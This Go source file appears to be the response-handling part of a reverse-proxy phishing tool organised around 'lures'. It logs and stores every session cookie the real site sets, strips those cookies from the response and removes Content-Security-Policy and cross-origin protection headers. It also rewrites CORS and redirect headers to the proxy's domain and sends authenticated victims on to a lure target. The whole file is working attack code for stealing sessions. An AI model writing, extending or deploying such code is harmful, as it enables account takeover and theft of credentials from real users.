package main

import (
	"io"
	"log"
	"net/http"
	"strings"

	"github.com/gofiber/fiber/v2"
)

const HeaderTargetURL = "X-Target-Url"

type AuthService interface {
	IsAuthenticated(c *fiber.Ctx) bool
}

type ResponseProcessor interface {
	Process(c *fiber.Ctx, resp *http.Response)
}

func NewResponseProcessor(conv DomainConverter, urlProc, htmlProc RegexProcessor,
	cookieSaver CookieSaver, authService AuthService, lureService LureService) ResponseProcessor {
	return &responseProcessor{conv, urlProc, htmlProc, cookieSaver, authService, lureService}
}

type responseProcessor struct {
	conv        DomainConverter
	urlProc     RegexProcessor
	htmlProc    RegexProcessor
	cookieSaver CookieSaver
	authService AuthService
	lureService LureService
}

func (p *responseProcessor) Process(c *fiber.Ctx, resp *http.Response) {
	p.writeCookies(c, resp)
	if p.targetRedirect(c, resp) {
		return
	}
	p.convertCORS(resp)
	p.removePolicyHeaders(resp)
	p.convertLocation(resp)
	p.writeHeaders(c, resp)
	p.writeBody(c, resp)
	c.Status(resp.StatusCode)
}

//nolint:errcheck
func (p *responseProcessor) targetRedirect(c *fiber.Ctx, resp *http.Response) bool {
	if !p.authService.IsAuthenticated(c) {
		return false
	}
	sess := getProxySession(c)
	if sess == nil {
		return false
	}
	lure, err := p.lureService.GetByURL(sess.LureURL())
	if err != nil {
		log.Println("lureService error: ", err)
		return false
	}
	if lure == nil {
		return false
	}
	contentType := p.getContentType(resp)
	if strings.Contains(contentType, "text/html") {
		// TODO log error
		c.Status(fiber.StatusFound).Redirect(lure.TargetURL)
		return true
	}
	resp.Header[HeaderTargetURL] = []string{lure.TargetURL}
	return false
}

func (p *responseProcessor) convertCORS(resp *http.Response) {
	originHeader := resp.Request.Header["Origin"]
	if len(originHeader) > 0 {
		proxyOrigin := p.conv.ToProxyURL(originHeader[0])
		resp.Header["Access-Control-Allow-Origin"] = []string{proxyOrigin}
		resp.Header["Access-Control-Allow-Credentials"] = []string{"true"}
		exposeHeaders := resp.Header["Access-Control-Expose-Headers"]
		if len(exposeHeaders) == 0 {
			resp.Header["Access-Control-Expose-Headers"] = []string{HeaderTargetURL}
		} else if exposeHeaders[0] != "*" {
			exposeHeaders = append(exposeHeaders, HeaderTargetURL)
			resp.Header["Access-Control-Expose-Headers"] = []string{strings.Join(exposeHeaders, ",")}
		}
	}
}

func (*responseProcessor) removePolicyHeaders(resp *http.Response) {
	resp.Header.Del("Content-Security-Policy")
	resp.Header.Del("Content-Security-Policy-Report-Only")
	resp.Header.Del("Cross-Origin-Opener-Policy")
	resp.Header.Del("Cross-Origin-Opener-Policy-Report-Only")
	resp.Header.Del("Cross-Origin-Embedder-Policy")
	resp.Header.Del("Cross-Origin-Embedder-Policy-Report-Only")
	resp.Header.Del("Report-To")
}

func (p *responseProcessor) convertLocation(resp *http.Response) {
	p.convertHeaderDomain(resp, "Location")
	p.convertHeaderDomain(resp, "Content-Location")
}

func (p *responseProcessor) convertHeaderDomain(resp *http.Response, headerName string) {
	value := resp.Header[headerName]
	if len(value) == 0 {
		return
	}
	resp.Header[headerName] = []string{p.conv.ToProxyURL(value[0])}
}

func (p *responseProcessor) writeCookies(c *fiber.Ctx, resp *http.Response) {
	if resp.Request.Method == http.MethodOptions {
		return
	}
	cookies := resp.Cookies()
	for _, cookie := range cookies {
		log.Println(resp.Request.URL, "set cookie:", cookie.String())
	}
	if err := p.cookieSaver.SaveCookies(c, resp.Request.URL, cookies); err != nil {
		log.Println("saveCookies error: ", err)
	}
	resp.Header.Del("Set-Cookie")
}

func (*responseProcessor) writeHeaders(c *fiber.Ctx, resp *http.Response) {
	for header, values := range resp.Header {
		for _, v := range values {
			c.Response().Header.Add(header, v)
		}
	}
}

//nolint:errcheck
func (p *responseProcessor) writeBody(w io.Writer, resp *http.Response) {
	contentType := p.getContentType(resp)
	if strings.Contains(contentType, "text/html") {
		p.htmlProc.ProcessAll(w, resp.Body)
		return
	}
	if processContentTypeRegexp.MatchString(contentType) {
		p.urlProc.ProcessAll(w, resp.Body)
	} else {
		io.Copy(w, resp.Body)
	}
}

func (*responseProcessor) getContentType(resp *http.Response) string {
	contentType := resp.Header["Content-Type"]
	if len(contentType) > 0 {
		return strings.ToLower(contentType[0])
	}
	return ""
}
